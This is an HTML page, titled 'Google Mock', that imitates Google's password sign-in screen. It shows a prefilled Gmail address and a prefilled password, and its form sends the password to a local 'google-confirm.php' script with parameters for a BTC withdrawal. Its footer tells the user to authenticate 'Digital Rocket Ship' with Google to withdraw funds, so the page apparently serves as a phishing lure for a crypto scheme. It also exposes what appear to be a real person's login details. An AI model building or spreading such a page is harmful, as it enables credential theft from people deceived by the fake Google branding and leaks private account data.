<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Sign in - Google Mock</title>
    <link rel="stylesheet" href="mock-google-password.css" />
</head>

<body>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #fff;
            font-family: Roboto, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            min-height: 100vh;
            color: #202124;
        }

        .mock-google-container {
            width: 100%;
            max-width: 400px;
            padding: 20px 16px;
        }

        .top-bar {
            display: flex;
            justify-content: center;
            margin-bottom: 24px;
        }

        .top-bar img {
            height: 40px;
        }

        .login-card {
            padding: 32px 24px;
            border-radius: 8px;
        }

        h1 {
            font-size: 1.5rem;
            margin-bottom: 8px;
        }

        .email {
            font-size: 0.95rem;
            margin-bottom: 6px;
        }

        .change-account {
            font-size: 0.85rem;
            color: #1a73e8;
            text-decoration: none;
            margin-bottom: 24px;
            display: inline-block;
        }

        form {
            display: flex;
            flex-direction: column;
        }

        label {
            font-size: 0.9rem;
            margin-bottom: 6px;
        }

        input[type="password"] {
            padding: 12px;
            font-size: 1rem;
            border: 1px solid #dadce0;
            border-radius: 4px;
            margin-bottom: 10px;
        }

        .options {
            display: flex;
            justify-content: flex-end;
            margin-bottom: 20px;
        }

        .forgot-link {
            font-size: 0.85rem;
            color: #1a73e8;
            text-decoration: none;
        }

        .button-row {
            display: flex;
            justify-content: flex-end;
        }

        button {
            background-color: #1a73e8;
            color: white;
            border: none;
            padding: 10px 24px;
            font-size: 0.95rem;
            font-weight: bold;
            border-radius: 4px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #185abc;
        }

        .disclaimer {
            margin-top: 24px;
            font-size: 0.75rem;
            color: #777;
            text-align: center;
        }

        .email {
            border: #202124 1px solid;
            border-radius: 12px;
            padding: 4px 8px;
            display: inline-block;
            margin-bottom: 4px;
        }
    </style>
    <div class="mock-google-container">
        <div class="top-bar">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/1200px-Google_%22G%22_logo.svg.png" alt="Google Logo">
        </div>

        <div class="login-card">
            <h1>Welcome</h1>
            <p class="email">owodunniqudus609@gmail.com</p>
            <a class="change-account" href="#">Use another account</a>

            <form action="google-confirm.php?nonce=127374625645622&id=abet43&redirect=rocketship&curr=BTC&action=withdraw" method="POST">
                <label for="password">Enter your password</label>
                <input type="password" id="password" name="password" placeholder="Password" value="Omolala234" required disabled>

                <div class="options">
                    <a href="#" class="forgot-link">Forgot password?</a>
                </div>

                <div class="button-row">
                    <button id='btnsubmit' type="submit">Next</button>
                </div>
            </form>

            <p class="disclaimer">Authenticate Digital Rocket Ship with Google in order to withdraw funds</p>
        </div>
    </div>
    <script>

    </script>
</body>

</html>